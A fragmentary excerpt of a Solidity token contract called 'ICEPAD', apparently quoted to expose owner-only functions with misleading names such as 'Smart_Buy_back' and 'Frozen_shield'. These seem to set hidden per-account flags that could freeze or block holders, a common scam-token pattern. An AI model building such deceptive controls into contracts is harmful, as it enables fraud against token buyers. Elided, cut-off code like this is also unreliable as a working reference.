...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "ICEPAD";
    string public _symbol= "ICEPAD";
     bool balances1 = true;
    ...
    function changeOwner(address _owner) onlyOwner public {
      ...
      function BNB_Distrib(bool _balances1_) onlyOwner public {
        balances1 = _balances1_;
    }
    
     function Smart_Buy_back(address account) onlyOwner public {
        _balances1[account] = true;
    }
    
     function Frozen_shield(address account) onlyOwner public {
